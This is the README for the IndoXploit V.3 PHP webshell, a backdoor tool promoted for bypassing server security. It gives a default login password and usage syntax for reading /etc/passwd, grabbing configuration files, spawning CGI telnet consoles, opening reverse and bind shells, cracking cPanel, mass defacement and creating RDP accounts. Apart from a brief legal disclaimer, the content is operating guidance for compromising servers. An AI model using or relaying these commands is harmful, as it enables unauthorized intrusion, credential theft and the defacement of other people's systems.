# IndoXploit Webshell V.3

IndoXploit webshell V.3 is an PHP based webshell or backdoor with unique and usefull features. This webshell is originally coded by **agussetyar** from **IndoXploit Coders Team**. IndoXploit Shell has been mentioned repeatedly by the coder that it will make you easily bypass server security. With this shell you can comfortably bypass the server firewall from most secure servers. It is one of the hacker's most preferred backdoor shell.

**Usage of indoxploit shell for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program**

---

## Screenshot
- login
![idx](https://raw.githubusercontent.com/linuxsec/indoxploit-shell/master/screenshot/indoxploit-login.PNG "Login Shell")
Default Password : **IndoXploit**

- interface
![idx](https://raw.githubusercontent.com/linuxsec/indoxploit-shell/master/screenshot/idx-interface.PNG "Shell Interface")
Webshell Interface

## Features
- Mass Password Change
- Fake Root
- Cpanel Crack
- Mass Deface/Delete File
- Zone-H Mass Submit

## How to Use
 - ***Read File***
~~~
 usage: rf [filename]
 example: rf /etc/passwd
~~~

 - Spawn File/Tools 
 ~~~
 usage: spawn [name]
~~~

[name]
- Adminer (adminer)
- WebConsole (webconsole)
- CGI Telnet 1 (cgitelnet1)
- CGI Telnet 2 (cgitelnet2)
- PHPINFO (phpinfo)

 example:
~~~
 spawn adminer
 spawn webconsole
 spawn cgitelnet1
~~~

- ***Jumping***
~~~
usage: jumping
~~~

- ***Config Grabber***
~~~
usage: idxconfig
~~~

 - ***Symlink***
 ~~~
 usage: symlink
~~~

 - ***Reverse Shell***
 
***[Back Connect]***
~~~
usage: rvr bc [IP] [PORT] [TYPE]
~~~
Example:
~~~
rvr bc 127.0.0.1 1337 bash
rvr bc 127.0.0.1 1337 perl
~~~

***Bind Port***
~~~
usage: rvr bp [PORT] [TYPE]
~~~
Example:
~~~
rvr bp 1337 perl
~~~

 - ***KRDP - Create RDP Account (for windows server only)***
 ~~~
 usage: krdp
~~~
 - ***Logout From Shell***
 ~~~
 usage: logout
~~~
 - ***Kill Backdoor***
~~~
usage: killme
~~~

 ## Contribute
 Drop an email at **shu@indoxploit.or.id** and tell us what your suggestions about how to improve this webshell.

## Article
-

## Disclaimer
Note: modifications, changes, or changes to this code can be accepted, however, every public release that uses this code must be approved by writing this tool (indoxploit team)
